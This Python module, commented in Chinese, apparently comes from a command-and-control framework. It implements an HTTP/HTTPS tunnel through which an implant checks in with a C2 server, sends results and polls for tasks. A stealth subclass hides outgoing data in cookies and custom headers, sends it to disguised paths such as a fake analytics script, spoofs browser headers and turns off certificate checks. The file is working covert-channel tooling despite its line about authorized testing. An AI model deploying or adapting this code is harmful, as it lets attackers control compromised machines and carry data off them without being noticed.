#!/usr/bin/env python3
"""
HTTP 隧道 - HTTP/HTTPS Tunnel

通过 HTTP/HTTPS 协议传输 C2 数据，伪装成正常 Web 流量
仅用于授权渗透测试和安全研究

特性:
    - 支持 HTTP 和 HTTPS
    - 请求伪装 (User-Agent, Headers)
    - Cookie 和 Header 隐写
    - 代理支持
    - 会话管理
"""

import time
import uuid
import logging
from typing import Optional, Dict, Any, Union

from ..base import BaseTunnel, C2Config
from ..encoding import C2Encoder, TrafficObfuscator

logger = logging.getLogger(__name__)

# HTTP 客户端
try:
    from core.http import HTTPClient, HTTPConfig, HTTPResponse
    HAS_HTTP_CLIENT = True
except ImportError:
    HAS_HTTP_CLIENT = False

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


class HTTPTunnel(BaseTunnel):
    """
    HTTP/HTTPS 隧道

    通过 HTTP/HTTPS 请求传输数据，伪装成正常的 Web 流量

    Usage:
        config = C2Config(
            server="c2.example.com",
            port=443,
            protocol="https"
        )
        tunnel = HTTPTunnel(config)

        if tunnel.connect():
            tunnel.send(b"data")
            response = tunnel.receive()
            tunnel.disconnect()
    """

    def __init__(self, config: C2Config):
        """
        初始化 HTTP 隧道

        Args:
            config: C2 配置
        """
        super().__init__(config)

        self._client: Optional[Any] = None
        self._session_id: Optional[str] = None
        self._last_request_time: float = 0
        self._request_interval: float = 0.1  # 最小请求间隔

        # 编码器和混淆器
        self.encoder = C2Encoder()
        self.obfuscator = TrafficObfuscator()

        # 响应缓冲
        self._response_buffer: list[bytes] = []

    @property
    def base_url(self) -> str:
        """获取基础 URL"""
        protocol = 'https' if self.config.protocol == 'https' else 'http'
        return f"{protocol}://{self.config.server}:{self.config.port}"

    def connect(self) -> bool:
        """
        建立 HTTP 会话

        Returns:
            是否成功
        """
        try:
            self._create_client()

            # 初始化会话
            init_data = {
                'id': str(uuid.uuid4()),
                'timestamp': int(time.time()),
            }

            response = self._post(
                self.config.checkin_path,
                json=init_data
            )

            if response and self._is_success(response):
                resp_data = self._get_json(response)
                self._session_id = resp_data.get('session') or resp_data.get('id') or str(uuid.uuid4())[:16]
                self._connected = True
                logger.debug(f"HTTP tunnel connected, session: {self._session_id}")
                return True

            logger.warning("HTTP tunnel connection failed")
            return False

        except Exception as e:
            logger.error(f"HTTP tunnel connect error: {e}")
            return False

    def disconnect(self) -> None:
        """关闭 HTTP 会话"""
        if self._connected and self._session_id:
            try:
                self._post(
                    self.config.close_path,
                    json={'session': self._session_id}
                )
            except Exception as e:
                logger.debug(f"Disconnect request failed: {e}")

        self._close_client()
        self._connected = False
        self._session_id = None
        logger.debug("HTTP tunnel disconnected")

    def send(self, data: bytes) -> bool:
        """
        发送数据

        将数据编码后通过 HTTP POST 发送

        Args:
            data: 要发送的数据

        Returns:
            是否成功
        """
        if not self._connected:
            logger.warning("Cannot send: not connected")
            return False

        try:
            # 速率限制
            self._rate_limit()

            # 编码数据
            encoded = self.encoder.base64_encode(data)

            # 构建请求
            request_data = {
                'payload': encoded,
                'timestamp': int(time.time() * 1000),
            }

            headers = {
                'X-Session': self._session_id,
                'X-Request-ID': str(uuid.uuid4())[:8],
            }

            response = self._post(
                self.config.result_path,
                headers=headers,
                json=request_data
            )

            if response and self._is_success(response):
                return True

            logger.warning(f"Send failed: {self._get_status(response)}")
            return False

        except Exception as e:
            logger.error(f"Send error: {e}")
            return False

    def receive(self, timeout: Optional[float] = None) -> Optional[bytes]:
        """
        接收数据

        通过 HTTP GET 轮询服务器

        Args:
            timeout: 超时时间

        Returns:
            接收到的数据，无数据返回 None
        """
        if not self._connected:
            logger.warning("Cannot receive: not connected")
            return None

        try:
            # 速率限制
            self._rate_limit()

            headers = {
                'X-Session': self._session_id,
            }

            response = self._get(
                self.config.task_path,
                headers=headers,
                timeout=timeout
            )

            if response and self._is_success(response):
                resp_data = self._get_json(response)

                # 提取数据
                encoded = resp_data.get('data') or resp_data.get('payload')
                if encoded:
                    return self.encoder.base64_decode(encoded)

            return None

        except Exception as e:
            logger.debug(f"Receive error: {e}")
            return None

    # ==================== 内部方法 ====================

    def _create_client(self) -> None:
        """创建 HTTP 客户端"""
        if HAS_HTTP_CLIENT:
            # 使用统一 HTTP 客户端
            http_config = HTTPConfig(
                timeout=self.config.timeout,
                verify_ssl=False,
                default_headers=self._build_headers(),
            )

            if self.config.proxy:
                http_config.proxy.http_proxy = self.config.proxy
                http_config.proxy.https_proxy = self.config.proxy

            self._client = HTTPClient(http_config)

        elif HAS_REQUESTS:
            # 回退到 requests
            import requests
            session = requests.Session()
            session.verify = False
            session.headers.update(self._build_headers())

            if self.config.proxy:
                session.proxies = {
                    'http': self.config.proxy,
                    'https': self.config.proxy,
                }

            self._client = session

        else:
            raise ImportError("需要安装 requests 或 httpx: pip install requests")

    def _close_client(self) -> None:
        """关闭 HTTP 客户端"""
        if self._client:
            try:
                if hasattr(self._client, 'close'):
                    self._client.close()
            except Exception as exc:
                logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

            self._client = None

    def _build_headers(self) -> Dict[str, str]:
        """构建请求头"""
        headers = {
            'User-Agent': self.config.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
        }
        headers.update(self.config.headers)
        return headers

    def _rate_limit(self) -> None:
        """速率限制"""
        now = time.time()
        elapsed = now - self._last_request_time

        if elapsed < self._request_interval:
            time.sleep(self._request_interval - elapsed)

        self._last_request_time = time.time()

    def _build_url(self, path: str) -> str:
        """构建完整 URL"""
        if path.startswith('http'):
            return path
        return f"{self.base_url}{path}"

    def _get(
        self,
        path: str,
        headers: Optional[Dict[str, str]] = None,
        params: Optional[Dict[str, Any]] = None,
        timeout: Optional[float] = None
    ) -> Optional[Any]:
        """发送 GET 请求"""
        url = self._build_url(path)
        timeout = timeout or self.config.timeout

        try:
            if HAS_HTTP_CLIENT and hasattr(self._client, 'get'):
                return self._client.get(url, headers=headers, params=params, timeout=timeout)
            elif HAS_REQUESTS:
                return self._client.get(url, headers=headers, params=params, timeout=timeout, verify=False)
        except Exception as e:
            logger.debug(f"GET {path} failed: {e}")
            return None

    def _post(
        self,
        path: str,
        headers: Optional[Dict[str, str]] = None,
        json: Optional[Dict[str, Any]] = None,
        data: Optional[Any] = None,
        timeout: Optional[float] = None
    ) -> Optional[Any]:
        """发送 POST 请求"""
        url = self._build_url(path)
        timeout = timeout or self.config.timeout

        try:
            if HAS_HTTP_CLIENT and hasattr(self._client, 'post'):
                return self._client.post(url, headers=headers, json=json, data=data, timeout=timeout)
            elif HAS_REQUESTS:
                return self._client.post(url, headers=headers, json=json, data=data, timeout=timeout, verify=False)
        except Exception as e:
            logger.debug(f"POST {path} failed: {e}")
            return None

    def _is_success(self, response: Any) -> bool:
        """检查响应是否成功"""
        if response is None:
            return False

        if hasattr(response, 'ok'):
            return response.ok

        if hasattr(response, 'status_code'):
            return 200 <= response.status_code < 400

        return False

    def _get_status(self, response: Any) -> int:
        """获取响应状态码"""
        if response is None:
            return 0

        if hasattr(response, 'status_code'):
            return response.status_code

        return 0

    def _get_json(self, response: Any) -> Dict[str, Any]:
        """获取响应 JSON"""
        if response is None:
            return {}

        try:
            if hasattr(response, 'json'):
                result = response.json
                if callable(result):
                    return result()
                return result
        except Exception as exc:
            logging.getLogger(__name__).warning("Suppressed exception", exc_info=True)

        return {}


# ==================== 高级 HTTP 隧道 ====================

class StealthHTTPTunnel(HTTPTunnel):
    """
    隐蔽 HTTP 隧道

    增强隐蔽性:
    - 随机化请求时间
    - 多种数据隐藏方式
    - 模拟正常浏览行为
    """

    def __init__(self, config: C2Config):
        super().__init__(config)
        import random
        self._random = random

    def send(self, data: bytes) -> bool:
        """隐蔽发送数据"""
        # 随机选择隐藏方式
        method = self._random.choice(['body', 'cookie', 'header'])

        if method == 'cookie':
            return self._send_via_cookie(data)
        elif method == 'header':
            return self._send_via_header(data)
        else:
            return super().send(data)

    def _send_via_cookie(self, data: bytes) -> bool:
        """通过 Cookie 发送数据"""
        encoded = self.encoder.url_safe_encode(data)

        headers = {
            'X-Session': self._session_id,
            'Cookie': f'session={self._session_id}; data={encoded}',
        }

        response = self._get(
            '/static/analytics.js',  # 伪装路径
            headers=headers
        )

        return response is not None and self._is_success(response)

    def _send_via_header(self, data: bytes) -> bool:
        """通过自定义 Header 发送数据"""
        encoded = self.encoder.base64_encode(data)

        headers = {
            'X-Session': self._session_id,
            'X-Custom-Data': encoded,
            'X-Timestamp': str(int(time.time())),
        }

        response = self._get(
            '/api/status',  # 伪装路径
            headers=headers
        )

        return response is not None and self._is_success(response)


__all__ = [
    'HTTPTunnel',
    'StealthHTTPTunnel',
]
